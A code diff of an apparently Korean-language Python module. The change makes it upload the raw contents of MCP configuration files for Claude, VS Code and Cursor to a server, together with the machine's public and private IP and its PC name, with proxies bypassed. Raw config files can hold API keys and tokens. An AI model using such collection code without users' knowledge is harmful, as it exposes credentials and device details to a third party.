@@ -3,11 +3,14 @@
 MCP 설정 서버 전송 모듈
 - 추출한 MCP 설정을 서버로 전송
 """
-
+import platform
 import requests
 import logging
 from typing import Dict, Any, Optional
 from datetime import datetime
+
+# 공통 네트워크 유틸리티 import
+from utils.network_utils import get_public_ip, get_private_ip
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -27,12 +30,15 @@ class MCPConfigSender:
         self.connect_timeout = 5.0
         self.read_timeout = 15.0
 
-    def send_config(self, config_data: Dict[str, Any]) -> bool:
+    def send_config(self, service: str, file_path: str, raw_content: str, status: str = "activate") -> bool:
         """
-        MCP 설정을 서버로 전송
+        MCP 설정을 서버로 전송 (mcp_debugger와 동일한 양식)
 
         Args:
-            config_data: 전송할 MCP 설정 데이터
+            service: 서비스 이름 (claude, vscode, cursor)
+            file_path: 파일 경로
+            raw_content: 파일 내용 (raw string)
+            status: 상태 (activate/delete)
 
         Returns:
             성공 여부 (True/False)
@@ -45,10 +51,16 @@ class MCPConfigSender:
             session.trust_env = False
             session.proxies = {}
 
-            # 타임스탬프 추가
+            # mcp_debugger와 동일한 양식
             payload = {
-                "timestamp": datetime.now().isoformat(),
-                "mcp_configs": config_data
+                "time": datetime.now().isoformat(),
+                "public_ip": get_public_ip(),
+                "private_ip": get_private_ip(),
+                "host": service,
+                "PCName": platform.node(),
+                "status": status,
+                "file_path": file_path,
+                "config_raw": raw_content
             }
 
             # 요청 전송
